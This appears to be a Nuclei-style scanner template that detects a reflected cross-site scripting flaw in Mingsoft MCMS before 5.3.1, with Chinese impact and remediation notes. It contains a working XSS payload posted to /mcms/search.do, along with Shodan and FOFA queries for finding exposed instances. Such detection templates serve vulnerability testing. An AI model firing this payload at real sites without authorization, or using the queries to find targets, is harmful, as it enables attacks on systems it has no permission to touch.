id: mcms-search-xss

info:
  name: Mingsoft MCMS < 5.3.1 - 跨站脚本漏洞
  author: ritikchaddha
  severity: medium
  description: Mingsoft MCMS < 5.3.1 - 跨站脚本 存在跨站脚本漏洞。该模板依据实际请求路径、返回特征与命中证据验证目标是否暴露相应漏洞。
  impact: |
    - 攻击者可在受害者浏览器上下文中执行恶意脚本。
    - 可能导致 Cookie 窃取、会话劫持、页面篡改或钓鱼攻击。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：version 5.4 or above.。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://gitee.com/mingSoft/MCMS/issues/I5MT8Y
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79,CWE-83
    epss-score: 0.00345
    epss-percentile: 0.6789
    cpe: cpe:2.3:a:mingsoft:mcms:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: mingsoft
    product: mcms
    shodan-query: http.favicon.hash:1464851260
    fofa-query: icon_hash="1464851260"
  tags: mingsoft,mcms,xss,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "mingsoft.net"
        internal: true

  - raw:
      - |
        POST /mcms/search.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        content_title=1"><sVg/Onload=alert`document.domain`></p>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "><sVg/Onload=alert`document.domain`>"

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
